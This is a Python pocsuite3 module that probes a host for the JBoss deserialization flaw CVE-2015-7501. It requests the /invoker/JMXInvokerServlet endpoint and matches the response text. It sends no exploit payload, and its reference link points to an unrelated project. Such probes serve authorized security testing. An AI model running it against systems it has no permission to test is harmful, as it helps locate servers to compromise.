#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @File : jboss_cve_2015_7501_unserialization.py
# @Author : Norah C.IV
# @Time : 2022/5/6 17:18
# @Software: PyCharm
import re

import requests

from pocsuite3.lib.core.enums import VUL_TYPE, POC_CATEGORY
from pocsuite3.lib.core.poc import POCBase, Output
from pocsuite3.lib.core.register import register_poc


class DemoPOC(POCBase):
    vulID = '3'
    version = '1'
    author = ['Norah C.IV']
    vulDate = '2022-05-06'
    createDate = '2022-05-06'
    updateDate = '2022-05-06'
    references = ['https://github.com/Mr-xn/sunlogin_rce']
    name = 'JBoss反序列化漏洞(CVE-2015-7501)'
    appPowerLink = ''
    appName = 'JBoss'
    appVersion = ''
    vulType = VUL_TYPE.COMMAND_EXECUTION
    desc = '''这是经典的JBoss反序列化漏洞，JBoss在/invoker/JMXInvokerServlet请求中读取了用户传入的对象，然后我们利用Apache Commons 
    Collections中的Gadget执行任意代码'''
    samples = ['']
    category = POC_CATEGORY.TOOLS.CRACK
    protocol = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 80
        payload = '/invoker/JMXInvokerServlet'
        url = 'https://' + host + ':' + str(port) + payload

        req = requests.get(url=url, timeout=3)
        if req.status_code == 200 and re.search(r'jboss', req.text) and re.search(r'java', req.text):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = "JBoss反序列化漏洞(CVE-2015-7501)"
            result['VerifyInfo']['Payload'] = url
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')

        return output


register_poc(DemoPOC)
